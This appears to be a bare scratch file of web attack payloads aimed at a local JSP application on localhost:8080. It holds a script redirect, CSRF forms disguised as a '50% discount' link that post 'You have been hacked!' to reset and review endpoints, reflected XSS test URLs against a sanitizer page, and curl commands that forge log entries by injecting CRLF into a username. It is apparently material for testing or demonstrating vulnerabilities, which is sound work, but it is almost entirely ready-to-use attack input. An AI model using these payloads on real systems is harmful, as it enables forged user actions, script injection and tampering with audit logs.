<script>window.location.href="http://www.google.com";</script>

Get 50% discount For details click <a href="/reviews.jsp">here</a> or
<form name="exploit" action="/reset.jsp" method="post" style="display: inline;">
    <input type="hidden" name="review" value="You have been hacked!"/>
    <input type="hidden" name="csrfToken" value="abc"/>
    <input type="submit"  style="background: none !important; border: none !important; padding: 0 !important; font-family: serif; font-size: 1em; color: blue; text-decoration: underline; cursor: pointer;" value="here"/>
    <button type="submit" style="background: none !important; border: none !important; padding: 0 !important; font-family: serif; font-size: 1em; color: blue; text-decoration: underline; cursor: pointer;">here</button>
</form>.

Get 50% discount For details click
<form name="exploit" action="/reviews.jsp" method="post" style="display: inline;">
    <input type="hidden" name="review" value="You have been hacked!"/>
    <button type="submit" style="background: none !important; border: none !important; padding: 0 !important; font-family: serif; font-size: 1em; color: blue; text-decoration: underline; cursor: pointer;">here</button>
</form>.

http://localhost:8080/sanitizer.jsp?value=Get%20discount%20For%20details%20click%20%3Cform%20name=%22exploit%22%20action=%22/reviews.jsp%22%20method=%22post%22%20style=%22display:%20inline;%22%3E%20%3Cinput%20type=%22hidden%22%20name=%22review%22%20value=%22You%20have%20been%20hacked!%22/%3E%20%3Cbutton%20type=%22submit%22%20style=%22background:%20none%20!important;%20border:%20none%20!important;%20padding:%200%20!important;%20font-family:%20serif;%20font-size:%201em;%20color:%20blue;%20text-decoration:%20underline;%20cursor:%20pointer;%22%3Ehere%3C/button%3E%20%3C/form%3E
http://localhost:8080/sanitizer.jsp?value=<script>window.location.href="http://www.google.com";</script>
http://localhost:8080/sanitizer.jsp?value=<script>alert("This an alert!")</script>&escape=predefined
http://localhost:8080/sanitizer.jsp?value=<script>alert("This an alert!")</script>&escape=all
http://localhost:8080/sanitizer.jsp?value=<script>alert("This an alert!")</script>

http://localhost:8080/sanitizer.jsp?value=<b>bold</b>&escape=predefined
http://localhost:8080/sanitizer.jsp?value=<b>bold</b&escape=all
http://localhost:8080/sanitizer.jsp?value=<b>bold</b


#logs ingestion
curl -d "username=guest%0A%0D$(date '+%Y-%m-%d %H:%M:%S')%20%5BINFO%5D%20MyServlet%20-%20Successfully%20logged%20in%0A%0D$(date '+%Y-%m-%d %H:%M:%S')%20%5BINFO%5D%20MyServlet%20-%20Authenticating%20admin&password=guest" -H "Content-Type: application/x-www-form-urlencoded" http://localhost:8080/do
curl -d "username=guest&password=guest" -H "Content-Type: application/x-www-form-urlencoded" http://localhost:8080/do